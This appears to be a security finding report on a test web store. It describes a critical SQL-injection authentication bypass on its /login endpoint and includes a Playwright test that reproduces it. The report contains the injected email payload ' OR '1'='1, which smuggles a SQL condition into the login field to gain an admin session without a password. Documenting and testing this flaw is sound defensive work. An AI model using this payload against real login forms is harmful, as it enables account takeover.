critical security
SQL-injection-style authentication bypass
POST /login
▸

The /login endpoint uses string-interpolated matching against the user list. Submitting admin@buggystore.local' OR '1'='1 as the email bypasses password validation and grants an admin session.

Impact: full account takeover of every user, including administrators. Attacker gains admin privileges without knowing any password.

Playwright reproduction
test('SQLi auth bypass on /login', async ({ page }) => {
  await page.goto('http://localhost:3000/login');
  await page.fill('#email', "admin@buggystore.local' OR '1'='1");
  await page.fill('#password', 'anything');
  await page.click('#btn-login');
  await expect(page).toHaveURL(/\/admin/);
  await expect(page.locator('h1')).toContainText('Admin Panel');
});
